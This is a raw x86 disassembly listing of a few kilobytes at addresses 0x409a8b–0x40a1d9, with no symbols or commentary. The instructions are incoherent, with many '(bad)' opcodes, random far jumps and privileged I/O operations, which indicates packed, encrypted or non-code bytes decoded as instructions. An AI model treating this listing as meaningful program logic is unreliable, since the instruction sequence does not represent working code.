  409a8b:	loope  0x409a8a
  409a8d:	adc    ebp,ebx
  409a8f:	fidiv  WORD PTR [ecx+edi*1-0xae096ae]
  409a96:	dec    ebx
  409a97:	adc    DWORD PTR [eax],edi
  409a99:	sbb    dh,BYTE PTR [edx-0x78]
  409a9c:	mov    al,0xe0
  409a9e:	aas    
  409a9f:	xchg   DWORD PTR [edx],eax
  409aa1:	test   BYTE PTR [ebp+0x38],0x9e
  409aa5:	mov    esi,0x79535249
  409aaa:	hlt    
  409aab:	jne    0x409abb
  409aad:	cli    
  409aae:	sbb    al,0x53
  409ab0:	xor    ah,dh
  409ab2:	cmp    al,0xfd
  409ab4:	pop    ss
  409ab5:	xchg   DWORD PTR ds:[edx+0x6ee6afee],ebp
  409abc:	add    DWORD PTR [eax+0x2d],edi
  409abf:	dec    edi
  409ac0:	adc    dh,BYTE PTR [edi+0x35]
  409ac3:	mov    ds:0x1cd776f,eax
  409ac8:	aam    0x46
  409aca:	adc    ebp,eax
  409acc:	sub    BYTE PTR [eax],ch
  409ace:	outs   dx,BYTE PTR ds:[esi]
  409acf:	cld    
  409ad0:	fidiv  DWORD PTR [ebx+0xf1643dc]
  409ad6:	adc    eax,0xe3d4cf5f
  409adb:	(bad)  
  409adc:	ret    0x1ecb
  409adf:	dec    eax
  409ae0:	pop    ss
  409ae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ae2:	outs   dx,BYTE PTR ds:[esi]
  409ae3:	gs pop esi
  409ae5:	xor    BYTE PTR [ebp-0x66d0a207],0x97
  409aec:	push   eax
  409aed:	jae    0x409b0d
  409aef:	sbb    eax,0xac7d1193
  409af4:	jl     0x409b59
  409af6:	in     al,dx
  409af7:	push   edi
  409af8:	cmp    al,0xa9
  409afa:	les    ebp,FWORD PTR [esp+esi*2]
  409afd:	imul   esi,DWORD PTR [ebx],0x8
  409b00:	repz ret 0xf287
  409b04:	push   edi
  409b05:	(bad)  
  409b06:	int    0x9e
  409b08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b09:	jns    0x409af4
  409b0b:	lds    edi,FWORD PTR [eax-0x44]
  409b0e:	inc    esi
  409b0f:	pop    esp
  409b10:	push   eax
  409b11:	sbb    ch,ah
  409b13:	add    DWORD PTR [ebx+esi*2+0x7c],ebp
  409b17:	test   DWORD PTR [ecx],esi
  409b19:	pop    esp
  409b1a:	test   al,0xa1
  409b1c:	out    0xa,eax
  409b1e:	in     al,0x8f
  409b20:	or     al,0xc8
  409b22:	ds rcl ebx,0x1e
  409b26:	sub    ah,bh
  409b28:	dec    ecx
  409b29:	aad    0x43
  409b2b:	inc    ebx
  409b2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b2d:	mov    bl,0xa4
  409b2f:	ret    0x5cdd
  409b32:	push   eax
  409b33:	or     eax,0x78402008
  409b38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b39:	jg     0x409b84
  409b3b:	psrad  mm5,mm3
  409b3e:	dec    eax
  409b3f:	push   ebp
  409b40:	popf   
  409b41:	sbb    al,0x1
  409b43:	add    al,0x99
  409b45:	inc    edx
  409b46:	or     dh,dh
  409b48:	mov    ss,WORD PTR [edi+0x7dca574a]
  409b4e:	stos   BYTE PTR es:[edi],al
  409b4f:	jb     0x409bac
  409b51:	retf   
  409b52:	fcomp  st(6)
  409b54:	retf   0xb8ea
  409b57:	ss jmp 0x409b69
  409b5a:	fcom   DWORD PTR [edx+0x41]
  409b5d:	dec    ebx
  409b5e:	push   esp
  409b5f:	push   0xffffffc5
  409b61:	mov    ds:0x248b8f3d,al
  409b66:	retf   
  409b67:	jne    0x409b82
  409b69:	popa   
  409b6a:	adc    sp,WORD PTR [esi+0x7]
  409b6e:	adc    eax,0x10dcc8a3
  409b73:	mov    BYTE PTR [edx-0x1b],cl
  409b76:	(bad)  
  409b77:	mov    eax,ds:0x298f61df
  409b7c:	and    ch,BYTE PTR [eax+ebx*1-0x1ab5ef21]
  409b83:	dec    edi
  409b84:	test   ebp,eax
  409b86:	repz test DWORD PTR [ebx],esp
  409b89:	dec    esi
  409b8a:	into   
  409b8b:	mov    ah,BYTE PTR [ebx+0x2b]
  409b8e:	xchg   esp,eax
  409b8f:	push   esp
  409b90:	clc    
  409b91:	enter  0xe865,0x75
  409b95:	mov    DWORD PTR [edi],edx
  409b97:	jns    0x409b8a
  409b99:	js     0x409b83
  409b9b:	(bad)  
  409b9c:	dec    edi
  409b9d:	cmp    al,0x8b
  409b9f:	rcr    cl,1
  409ba1:	inc    esp
  409ba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ba3:	cli    
  409ba4:	sbb    edx,eax
  409ba6:	outs   dx,BYTE PTR ds:[esi]
  409ba7:	push   ebx
  409ba8:	mov    edi,0xd7cd4dc4
  409bad:	es scas eax,DWORD PTR es:[edi]
  409baf:	sub    eax,0x4a8406b7
  409bb4:	push   esi
  409bb5:	fisttp WORD PTR [ecx-0x78]
  409bb8:	stos   BYTE PTR es:[edi],al
  409bb9:	outs   dx,BYTE PTR ds:[esi]
  409bba:	xlat   BYTE PTR ds:[ebx]
  409bbb:	sbb    al,0x96
  409bbd:	stc    
  409bbe:	aas    
  409bbf:	lahf   
  409bc0:	idiv   BYTE PTR [edx+ebx*1-0x38bb2ce0]
  409bc7:	dec    DWORD PTR [esi]
  409bc9:	pop    ebx
  409bca:	cwde   
  409bcb:	jg     0x409b7a
  409bcd:	stos   DWORD PTR es:[edi],eax
  409bce:	push   cs
  409bcf:	jg     0x409bcd
  409bd1:	jmp    0x409bdd
  409bd3:	xor    ah,0xe7
  409bd6:	mov    bh,0x95
  409bd8:	sar    DWORD PTR [ecx+0x3a],0xb9
  409bdc:	js     0x409bd1
  409bde:	test   eax,0x283e14a7
  409be3:	lock xchg edx,eax
  409be5:	pop    esp
  409be6:	cmp    ebx,DWORD PTR [esi-0x26cb77be]
  409bec:	(bad)
  409bf0:	out    0xb5,al
  409bf2:	test   al,0x66
  409bf4:	hlt    
  409bf5:	or     ebx,esi
  409bf7:	add    al,0x76
  409bf9:	jb     0x409c56
  409bfb:	test   eax,0x7b7fd875
  409c00:	xchg   ecx,eax
  409c01:	retf   0xdb88
  409c04:	fiadd  WORD PTR [edx]
  409c06:	retf   0xeca9
  409c09:	inc    esp
  409c0a:	xchg   edx,eax
  409c0b:	in     eax,0xb9
  409c0d:	pop    edx
  409c0e:	ja     0x409c89
  409c10:	out    0x5d,eax
  409c12:	rcl    DWORD PTR [esi+0x5ea94eeb],0x97
  409c19:	loope  0x409c3d
  409c1b:	aad    0x2
  409c1d:	test   DWORD PTR [eax],esp
  409c1f:	(bad)  
  409c20:	adc    BYTE PTR ds:0x74637384,dl
  409c26:	and    DWORD PTR [esi],esi
  409c28:	aas    
  409c29:	add    BYTE PTR [edi+0x5eded13d],cl
  409c2f:	ins    BYTE PTR es:[edi],dx
  409c30:	push   edi
  409c31:	ret    0xb965
  409c34:	jae    0x409c18
  409c36:	into   
  409c37:	add    ecx,DWORD PTR [eax-0x76]
  409c3a:	add    dl,bh
  409c3c:	push   esp
  409c3d:	jns    0x409c2e
  409c3f:	cwde   
  409c40:	pop    esi
  409c41:	dec    ebx
  409c42:	and    al,0x2d
  409c44:	pop    es
  409c45:	mov    bh,0xb3
  409c47:	daa    
  409c48:	sbb    al,0xa6
  409c4a:	adc    al,0xbf
  409c4c:	sahf   
  409c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c4e:	pop    es
  409c4f:	sub    BYTE PTR [edi],al
  409c51:	aam    0xfe
  409c53:	jbe    0x409c26
  409c55:	push   eax
  409c56:	push   edx
  409c57:	daa    
  409c58:	cmp    DWORD PTR [ebx],esi
  409c5a:	test   esp,esp
  409c5c:	push   esi
  409c5d:	mov    DWORD PTR [edx-0x3d0f615a],0xb0e8b782
  409c67:	add    bl,BYTE PTR ds:0xe7cd49b4
  409c6d:	lahf   
  409c6e:	mov    bh,BYTE PTR [edi+0x65]
  409c71:	sub    al,0xdf
  409c73:	cmp    al,0xb8
  409c75:	xor    DWORD PTR [esi-0x70de09d5],eax
  409c7b:	jg     0x409c8b
  409c7d:	into   
  409c7e:	in     eax,0x69
  409c80:	rcr    DWORD PTR [ebx+0x78],0xa
  409c84:	inc    ecx
  409c85:	sub    al,0x1f
  409c87:	and    edx,ebx
  409c89:	dec    edx
  409c8a:	test   DWORD PTR [ecx],edi
  409c8c:	mov    ebp,es
  409c8e:	pop    edi
  409c8f:	(bad)  
  409c90:	xchg   ebx,eax
  409c91:	mov    ebp,0x51385cec
  409c96:	jg     0x409c35
  409c98:	jo     0x409cf4
  409c9a:	cmc    
  409c9b:	ficomp DWORD PTR [ecx]
  409c9d:	and    DWORD PTR [edx],edx
  409c9f:	xchg   DWORD PTR [esi-0x7e72ddf6],edi
  409ca5:	mov    al,0xf0
  409ca7:	cmp    DWORD PTR ss:[edx+0xefdeec7],0xffffffd8
  409caf:	aad    0x4c
  409cb1:	pop    ecx
  409cb2:	sbb    eax,0x836d8699
  409cb7:	mov    WORD PTR [eax-0x7c3a47e0],gs
  409cbd:	out    0x67,al
  409cbf:	shl    DWORD PTR ds:0xf4dace3c,0x8a
  409cc6:	dec    eax
  409cc7:	jbe    0x409d1d
  409cc9:	push   ss
  409cca:	xchg   esi,eax
  409ccb:	xor    ebp,DWORD PTR [esi-0x2d5a3497]
  409cd1:	ror    DWORD PTR [edx],cl
  409cd3:	push   edx
  409cd4:	sti    
  409cd5:	sub    ebx,esi
  409cd7:	xchg   dl,ah
  409cd9:	mov    ebp,0xcb0800ed
  409cde:	outs   dx,BYTE PTR ds:[esi]
  409cdf:	pop    ebx
  409ce0:	push   eax
  409ce1:	mov    esi,0x2dc30860
  409ce6:	cli    
  409ce7:	mov    ch,0xb6
  409ce9:	clc    
  409cea:	inc    DWORD PTR [eax-0x568ccbe]
  409cf0:	adc    eax,DWORD PTR [esi+0x22ebc26]
  409cf6:	dec    ecx
  409cf7:	sub    al,0x7d
  409cf9:	sbb    BYTE PTR [esi],dh
  409cfb:	xor    DWORD PTR [ecx+0x0],eax
  409cfe:	ins    DWORD PTR es:[edi],dx
  409cff:	sbb    BYTE PTR [esi],dl
  409d01:	cmp    eax,DWORD PTR [ebp-0x45]
  409d04:	dec    ebp
  409d05:	mov    dh,0xcc
  409d07:	aaa    
  409d08:	xchg   ebp,eax
  409d09:	inc    esp
  409d0a:	jmp    0xe023:0xc6ef96b2
  409d11:	es xchg esp,eax
  409d13:	inc    eax
  409d14:	sub    DWORD PTR [eax+0x2fec493],ebp
  409d1a:	mov    dl,0xfb
  409d1c:	push   esp
  409d1d:	popa   
  409d1e:	jo     0x409d93
  409d20:	addr16 gs sub eax,ebx
  409d24:	sbb    al,0x58
  409d26:	inc    eax
  409d27:	mov    BYTE PTR [ebp-0x35e5e68],al
  409d2d:	aad    0xce
  409d2f:	mov    bh,0xbf
  409d31:	and    BYTE PTR [edi+0x28],dl
  409d34:	push   ss
  409d35:	sbb    eax,edx
  409d37:	dec    edi
  409d38:	nop
  409d39:	jmp    0x409d8a
  409d3b:	lock lds ebx,FWORD PTR [eax*1+0x776062eb]
  409d43:	and    BYTE PTR [esp+ecx*8+0x1372e0fe],dl
  409d4a:	fnstsw WORD PTR [edx+0x0]
  409d4d:	out    0xf5,eax
  409d4f:	jmp    0xa6c:0x6a1b01e5
  409d56:	add    dh,bh
  409d58:	sub    al,bl
  409d5a:	xchg   ebx,eax
  409d5b:	cmc    
  409d5c:	enter  0xefb2,0x96
  409d60:	mov    al,ds:0x4e100351
  409d65:	icebp  
  409d66:	pop    esi
  409d67:	cmc    
  409d68:	test   al,0xd2
  409d6a:	iret   
  409d6b:	(bad)  
  409d6c:	shl    DWORD PTR es:[eax],0x57
  409d70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d71:	int    0x18
  409d73:	fidivr WORD PTR ss:[eax+0x12]
  409d77:	fs dec eax
  409d79:	ret    
  409d7a:	jge    0x409d1a
  409d7c:	fisub  WORD PTR [ebx-0x496c829b]
  409d82:	out    dx,al
  409d83:	add    DWORD PTR [edx+0x9cb40f2],ecx
  409d89:	stos   BYTE PTR es:[edi],al
  409d8a:	sbb    esi,DWORD PTR [esi]
  409d8c:	nop
  409d8d:	stos   BYTE PTR es:[edi],al
  409d8e:	dec    ecx
  409d8f:	lea    ebp,[ecx+0xa]
  409d92:	pop    eax
  409d93:	xchg   dl,bl
  409d95:	repnz cmp ebx,DWORD PTR [ecx-0x255d1ec6]
  409d9c:	das    
  409d9d:	dec    edi
  409d9e:	out    0x1f,al
  409da0:	(bad)  
  409da2:	xchg   ecx,eax
  409da3:	fucom  st(7)
  409da5:	lds    esi,FWORD PTR [ebp+0x18]
  409da8:	jo     0x409d3b
  409daa:	inc    eax
  409dab:	mov    WORD PTR [eax+0x42],gs
  409dae:	in     al,0x1f
  409db0:	pusha  
  409db1:	xchg   edx,eax
  409db2:	ja     0x409e2c
  409db4:	cmc    
  409db5:	mov    eax,ebp
  409db7:	cdq    
  409db8:	fimul  DWORD PTR [ebx+0x0]
  409dbb:	pushw  0x1021
  409dbf:	adc    eax,0x701f0d8a
  409dc4:	(bad)  
  409dc5:	mov    eax,0x69c9516a
  409dca:	adc    BYTE PTR [ebp-0x7e],al
  409dcd:	cmp    DWORD PTR [ecx-0x3b35e854],eax
  409dd3:	jmp    0xf479d042
  409dd8:	repz adc eax,edx
  409ddb:	test   al,0xb5
  409ddd:	fistp  QWORD PTR [eax]
  409ddf:	pusha  
  409de0:	add    ecx,eax
  409de2:	loope  0x409dc0
  409de4:	sub    BYTE PTR [edx+0x7f],ch
  409de7:	and    eax,DWORD PTR [edi+0x21]
  409dea:	or     ebx,DWORD PTR [ecx+0x19572ec1]
  409df0:	pop    edx
  409df1:	push   ss
  409df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409df3:	in     al,dx
  409df4:	xlat   BYTE PTR ds:[ebx]
  409df5:	inc    ebx
  409df6:	add    DWORD PTR [esi-0x6c],ebp
  409df9:	cmc    
  409dfa:	sbb    DWORD PTR [eax],ebx
  409dfc:	pop    edx
  409dfd:	pop    es
  409dfe:	bswap  edx
  409e00:	retf   
  409e01:	scas   eax,DWORD PTR es:[edi]
  409e02:	fst    DWORD PTR [ebx+0x55ef091]
  409e08:	retf   0x15cf
  409e0b:	mov    eax,0xdeeb70a4
  409e10:	push   edx
  409e11:	loopne 0x409e13
  409e13:	mov    ebp,cs
  409e15:	push   cs
  409e16:	dec    esi
  409e17:	jae    0x409dd8
  409e19:	dec    eax
  409e1a:	fld    DWORD PTR [esp+ebx*4+0x45]
  409e1e:	inc    edi
  409e1f:	aam    0x41
  409e21:	(bad)  
  409e22:	jmp    0x409dc2
  409e24:	(bad)  
  409e25:	lods   al,BYTE PTR ds:[esi]
  409e26:	xor    bh,cl
  409e28:	xrelease lock sbb BYTE PTR [edi+0x13],bl
  409e2d:	mov    esp,0xd8e7f1e1
  409e32:	jle    0x409e81
  409e34:	and    edi,edi
  409e36:	scas   eax,DWORD PTR es:[edi]
  409e37:	stos   DWORD PTR es:[edi],eax
  409e38:	jmp    0xd9ab:0x7be00d52
  409e3f:	scas   eax,DWORD PTR es:[edi]
  409e40:	gs je  0x409dc5
  409e43:	fild   WORD PTR [esi+0x0]
  409e46:	fs pop eax
  409e48:	pop    ebx
  409e49:	out    0xc8,al
  409e4b:	icebp  
  409e4c:	push   0x7f
  409e4e:	sbb    eax,0x5f0d78c7
  409e53:	into   
  409e54:	and    edi,ecx
  409e56:	jecxz  0x409e63
  409e58:	test   DWORD PTR [edi-0x31],0x8ee1d21a
  409e5f:	popf   
  409e60:	or     ah,0xfc
  409e63:	sti    
  409e64:	sar    DWORD PTR [ecx-0x45],cl
  409e67:	or     al,0x88
  409e69:	xor    ch,BYTE PTR [ecx+edi*8+0x54d8d153]
  409e70:	les    eax,FWORD PTR ds:0x57e57811
  409e76:	add    DWORD PTR [esi-0x48e9b480],0x29
  409e7d:	pop    esi
  409e7e:	xchg   edi,eax
  409e7f:	test   BYTE PTR [edx+0x17],0x64
  409e83:	repnz int 0x95
  409e86:	or     BYTE PTR [esi+edx*2],ch
  409e89:	pop    eax
  409e8a:	sbb    al,0x58
  409e8c:	pop    eax
  409e8d:	stos   DWORD PTR es:[edi],eax
  409e8e:	ja     0x409eb4
  409e90:	cmp    DWORD PTR [eax-0x20],ecx
  409e93:	dec    ebx
  409e94:	xor    al,0x32
  409e96:	test   al,0xdd
  409e98:	scas   al,BYTE PTR es:[edi]
  409e99:	cli    
  409e9a:	std    
  409e9b:	adc    dl,BYTE PTR [ecx+eax*8]
  409e9e:	adc    eax,0xbb2a8d05
  409ea3:	and    edx,DWORD PTR [esi-0x71]
  409ea6:	jle    0x409f03
  409ea8:	into   
  409ea9:	sbb    DWORD PTR [ecx-0x31],0xe44446d
  409eb0:	loop   0x409ee0
  409eb2:	idiv   BYTE PTR ds:[edi+ecx*8]
  409eb6:	cmc    
  409eb7:	jge    0x409f34
  409eb9:	pop    eax
  409eba:	push   ss
  409ebb:	loopne 0x409f27
  409ebd:	mov    BYTE PTR [ecx-0x602c9b7f],0x45
  409ec4:	or     BYTE PTR [edi+0x9],cl
  409ec7:	pop    ecx
  409ec8:	jle    0x409eb3
  409eca:	inc    esp
  409ecb:	into   
  409ecc:	clc    
  409ecd:	dec    eax
  409ece:	jmp    0x6b:0x2ee31e5e
  409ed5:	pop    ds
  409ed6:	pop    edi
  409ed7:	jno    0x409eee
  409ed9:	add    eax,0x6a41c69
  409ede:	jns    0x409e92
  409ee0:	mov    BYTE PTR [eax+eax*8+0x52],ah
  409ee4:	ja     0x409e78
  409ee6:	ja     0x409ecf
  409ee8:	inc    ebx
  409ee9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409eea:	ss push ds
  409eec:	(bad)  [ebx-0x12]
  409eef:	jecxz  0x409f01
  409ef1:	out    0x80,eax
  409ef3:	and    edi,DWORD PTR [eax]
  409ef5:	stos   DWORD PTR es:[edi],eax
  409ef6:	xor    eax,0x4d8215cc
  409efb:	sub    ecx,DWORD PTR [edx]
  409efd:	lds    ecx,FWORD PTR [esi+0x796f1000]
  409f03:	fld    QWORD PTR ds:0x675936f5
  409f09:	push   0xe4115dc6
  409f0e:	shr    cl,0xa1
  409f11:	cs xchg ecx,eax
  409f13:	mov    esi,0x7a9e9c16
  409f18:	and    eax,0xfa84103e
  409f1d:	sbb    BYTE PTR [eax],cl
  409f1f:	pop    esp
  409f20:	rol    esi,cl
  409f22:	mov    ch,BYTE PTR [ecx+edi*2+0x16]
  409f26:	ss push edi
  409f28:	sbb    dl,ch
  409f2a:	out    dx,eax
  409f2b:	pmuludq mm5,QWORD PTR [ecx+0x4b]
  409f2f:	or     ch,BYTE PTR [edi]
  409f31:	mov    ebx,0x9944e305
  409f36:	sahf   
  409f37:	push   es
  409f38:	and    eax,0x258c66d3
  409f3d:	arpl   cx,dx
  409f3f:	mov    eax,0x3273a006
  409f44:	fucom  st(6)
  409f46:	xchg   ebx,eax
  409f47:	pop    es
  409f48:	sub    BYTE PTR [eax],ah
  409f4a:	adc    DWORD PTR [esi+esi*1+0xd],eax
  409f4e:	jl     0x409fb0
  409f50:	adc    DWORD PTR [esi+0x3719d8b8],ecx
  409f56:	inc    edi
  409f57:	adc    BYTE PTR [ecx],cl
  409f59:	repnz mov esi,0xf3b6c074
  409f5f:	xor    ebp,DWORD PTR [esi+edx*4+0x62]
  409f63:	scas   eax,DWORD PTR es:[edi]
  409f64:	mov    dh,0x8d
  409f66:	out    0xbf,al
  409f68:	cmp    BYTE PTR [ebp-0x27dd3055],bh
  409f6e:	test   al,0x20
  409f70:	mov    ebx,0xf8492ec9
  409f75:	sub    al,0x84
  409f77:	shl    BYTE PTR [ebp+0x1b569044],cl
  409f7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f7e:	or     ebx,ebp
  409f80:	cmc    
  409f81:	addr16 sbb eax,0x270f5129
  409f87:	jecxz  0x409fd7
  409f89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f8a:	sub    eax,0xe0873b59
  409f8f:	sbb    al,0x7a
  409f91:	ins    BYTE PTR es:[edi],dx
  409f92:	jo     0x409f7e
  409f94:	(bad)  
  409f95:	pop    edx
  409f96:	cmp    edx,DWORD PTR [esi]
  409f98:	mov    esi,0x6d62774c
  409f9d:	xor    eax,0xed9b2487
  409fa2:	jne    0x409ff7
  409fa4:	shr    BYTE PTR [edx+0x59],1
  409fa7:	js     0x409f60
  409fa9:	inc    ebp
  409faa:	add    eax,DWORD PTR [eax+0x4d]
  409fad:	(bad)  
  409fae:	push   ss
  409faf:	adc    DWORD PTR [eax],edi
  409fb1:	dec    ebp
  409fb2:	popf   
  409fb3:	lock iret 
  409fb5:	(bad)  
  409fb6:	sar    bh,cl
  409fb8:	ss in  al,dx
  409fba:	pop    esi
  409fbb:	addr16 addr16 dec esp
  409fbe:	xchg   esi,eax
  409fbf:	shl    DWORD PTR [ecx+0x57],cl
  409fc2:	push   esi
  409fc3:	fimul  WORD PTR [edi+0x46]
  409fc6:	ret    
  409fc7:	xchg   edi,eax
  409fc8:	iret   
  409fc9:	mov    bh,0x59
  409fcb:	pop    es
  409fcc:	cdq    
  409fcd:	out    dx,al
  409fce:	xor    al,0xec
  409fd0:	add    BYTE PTR [esi+0x3131cadb],0x80
  409fd7:	nop
  409fd8:	fcom   st(1)
  409fda:	lds    esi,FWORD PTR [ecx-0x532b56d4]
  409fe0:	jmp    0x6fbc23c
  409fe5:	das    
  409fe6:	popf   
  409fe7:	push   ss
  409fe8:	ins    DWORD PTR es:[edi],dx
  409fe9:	out    0xce,al
  409feb:	sub    BYTE PTR [edx+ebp*2+0x670a3bf3],bl
  409ff2:	mov    cl,bl
  409ff4:	jns    0x409fd0
  409ff6:	adc    DWORD PTR [esi-0x66],esi
  409ff9:	push   esi
  409ffa:	aas    
  409ffb:	and    al,0xf4
  409ffd:	in     eax,0x29
  409fff:	iret   
  40a000:	mov    WORD PTR [edi],es
  40a002:	outs   dx,DWORD PTR ds:[esi]
  40a003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a004:	push   ecx
  40a005:	mov    dh,0x72
  40a007:	fimul  WORD PTR [ecx]
  40a009:	scas   al,BYTE PTR es:[edi]
  40a00a:	mov    dh,0xff
  40a00c:	nop
  40a00d:	retf   0xea49
  40a010:	pop    ebx
  40a011:	inc    edx
  40a012:	clc    
  40a013:	dec    ebx
  40a014:	xor    DWORD PTR [esi+0x5],esp
  40a017:	daa    
  40a018:	inc    edx
  40a019:	es and eax,0x9be83e8f
  40a01f:	ins    BYTE PTR es:[edi],dx
  40a020:	addr16 ffree st(6)
  40a023:	sbb    edi,DWORD PTR [edx]
  40a025:	mul    ebp
  40a027:	test   eax,0x2a59c102
  40a02c:	fadd   DWORD PTR cs:[ecx]
  40a02f:	xor    eax,0x2ba5a2f3
  40a034:	scas   eax,DWORD PTR es:[edi]
  40a035:	xchg   ebp,eax
  40a036:	out    dx,eax
  40a037:	push   ebp
  40a038:	jg     0x40a0b8
  40a03a:	loopne 0x409ff6
  40a03c:	retf   0xb5ca
  40a03f:	scas   eax,DWORD PTR es:[edi]
  40a040:	(bad)  
  40a041:	and    BYTE PTR [edi-0x61196cb8],ch
  40a047:	retf   0x3508
  40a04a:	or     eax,0x735d60ac
  40a04f:	add    esp,DWORD PTR ds:0x15f67ad1
  40a055:	(bad)  
  40a056:	aad    0xe4
  40a058:	xchg   esp,eax
  40a059:	pop    ebp
  40a05a:	mov    cl,0x13
  40a05c:	je     0x409fea
  40a05e:	inc    esi
  40a05f:	outs   dx,BYTE PTR ds:[esi]
  40a060:	jg     0x40a0c7
  40a062:	mov    ebx,0x71bf520c
  40a067:	cld    
  40a068:	sbb    ch,al
  40a06a:	mov    ebx,0x574cca0d
  40a06f:	inc    esp
  40a070:	jo     0x40a019
  40a072:	pop    ebx
  40a073:	mov    dl,0x1
  40a075:	xchg   ebx,eax
  40a076:	stc    
  40a077:	call   FWORD PTR [edi]
  40a079:	lods   eax,DWORD PTR ds:[esi]
  40a07a:	popa   
  40a07b:	inc    ecx
  40a07c:	cli    
  40a07d:	xchg   edi,eax
  40a07e:	or     ch,BYTE PTR [ecx-0x49]
  40a081:	das    
  40a082:	jnp    0x40a062
  40a084:	call   0x4636dde
  40a089:	inc    esp
  40a08a:	nop
  40a08b:	sub    ch,dl
  40a08d:	fstp   QWORD PTR [ecx+0x36eae551]
  40a093:	mov    edx,0x837d703d
  40a098:	mov    bl,0xfa
  40a09a:	or     DWORD PTR [ecx*8+0x77b81117],ebp
  40a0a1:	cmc    
  40a0a2:	jl     0x40a095
  40a0a4:	push   0x18fe8e61
  40a0a9:	mov    WORD PTR [ebx+0x20],?
  40a0ac:	inc    BYTE PTR [esi-0x572f911c]
  40a0b2:	sub    al,0x1b
  40a0b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0b5:	leave  
  40a0b6:	jno    0x40a067
  40a0b8:	sbb    eax,0xfc951733
  40a0bd:	inc    ebp
  40a0be:	jge    0x40a074
  40a0c0:	iret   
  40a0c1:	cmp    bh,BYTE PTR [edx+0x68d9a3b8]
  40a0c7:	or     BYTE PTR [edx-0x291fac5e],bl
  40a0cd:	int3   
  40a0ce:	dec    esi
  40a0cf:	mov    eax,0x25dc0c5d
  40a0d4:	(bad)  
  40a0d6:	jae    0x40a0aa
  40a0d8:	jne    0x40a07c
  40a0da:	push   eax
  40a0db:	retf   
  40a0dc:	or     BYTE PTR [esi],0x6d
  40a0df:	out    dx,eax
  40a0e0:	leave  
  40a0e1:	push   0xffffff89
  40a0e3:	xor    eax,0x3be9d29b
  40a0e8:	xor    DWORD PTR [ecx+0x58],edi
  40a0eb:	loope  0x40a0fd
  40a0ed:	push   cs
  40a0ee:	aam    0x31
  40a0f0:	inc    eax
  40a0f1:	jle    0x40a15d
  40a0f3:	stc    
  40a0f4:	mov    ebx,0x97a74035
  40a0f9:	sub    bh,cl
  40a0fb:	(bad)  
  40a0fc:	mov    ah,0xa8
  40a0fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0ff:	inc    edx
  40a100:	adc    eax,0xcbb50575
  40a105:	xor    al,0xb8
  40a107:	mov    bl,0x44
  40a109:	inc    ecx
  40a10a:	(bad)  
  40a10b:	dec    DWORD PTR [ebp+eiz*1+0x66]
  40a10f:	pop    esi
  40a110:	sub    ebx,DWORD PTR [esi]
  40a112:	jg     0x40a132
  40a114:	jle    0x40a0b0
  40a116:	and    eax,0x143103dd
  40a11b:	stc    
  40a11c:	or     edx,0x3d7e89ef
  40a122:	mov    ah,0xc
  40a124:	adc    al,0xd7
  40a126:	ins    DWORD PTR es:[edi],dx
  40a127:	lahf   
  40a128:	dec    eax
  40a129:	test   DWORD PTR [ebx],esi
  40a12b:	and    DWORD PTR [esi+0x194c4f95],ebp
  40a131:	fbld   TBYTE PTR [edx-0xd]
  40a134:	daa    
  40a135:	imul   ah
  40a137:	cdq    
  40a138:	pop    es
  40a139:	mov    ds:0xa277f74f,eax
  40a13e:	mov    eax,0xdcc3463a
  40a143:	jo     0x40a173
  40a145:	xchg   ecx,eax
  40a146:	add    DWORD PTR [edi+0x18],eax
  40a149:	fsubp  st(4),st
  40a14b:	xor    edi,edx
  40a14d:	(bad)  
  40a14e:	pop    esi
  40a14f:	mov    DWORD PTR [eax+0x77fa55e6],edi
  40a155:	in     al,0xc8
  40a157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a158:	imul   ebx,DWORD PTR [ebp-0x25d13408],0x70
  40a15f:	int3   
  40a160:	arpl   WORD PTR [esi-0x19239309],sp
  40a166:	cmp    ah,BYTE PTR [ecx]
  40a168:	adc    al,0x6a
  40a16a:	retf   
  40a16b:	jge    0x40a1d6
  40a16d:	dec    ebx
  40a16e:	and    edi,DWORD PTR [ebx-0xbb4599c]
  40a174:	mov    cl,0xe4
  40a176:	das    
  40a177:	retf   
  40a178:	mov    edx,0x4f190087
  40a17d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a17e:	int    0x80
  40a180:	fild   WORD PTR [edx-0x6d]
  40a183:	and    eax,0xc95d615c
  40a188:	call   0x38ec63d2
  40a18d:	mov    ah,0x4
  40a18f:	lods   eax,DWORD PTR ds:[esi]
  40a190:	sub    DWORD PTR [ecx+0x1c8f5127],ebx
  40a196:	out    dx,eax
  40a197:	mov    ebp,0x183286a7
  40a19c:	into   
  40a19d:	mov    al,ds:0x31535acd
  40a1a2:	imul   edx,DWORD PTR [eax],0x4f7ab9ed
  40a1a8:	test   BYTE PTR [ecx],cl
  40a1aa:	sbb    cl,cl
  40a1ac:	stc    
  40a1ad:	lahf   
  40a1ae:	cmp    ch,BYTE PTR [eax]
  40a1b0:	fisub  WORD PTR [edx]
  40a1b2:	sub    ch,BYTE PTR [edi-0x4d902088]
  40a1b8:	dec    ecx
  40a1b9:	cmp    BYTE PTR [edi],cl
  40a1bb:	hlt    
  40a1bc:	das    
  40a1bd:	popa   
  40a1be:	pushf  
  40a1bf:	sub    BYTE PTR [esi],dl
  40a1c1:	inc    ecx
  40a1c2:	xor    ebp,DWORD PTR [ecx+0x721bfcdf]
  40a1c8:	aad    0x90
  40a1ca:	sbb    edi,DWORD PTR [ebx+0x4f42dacf]
  40a1d0:	mov    ah,0xb1
  40a1d2:	jg     0x40a1c6
  40a1d4:	in     eax,dx
  40a1d5:	pop    ebp
  40a1d6:	and    DWORD PTR [ebx-0x7e],ebp
  40a1d9:	or     ebp,DWORD PTR ds:0x8f3cae18
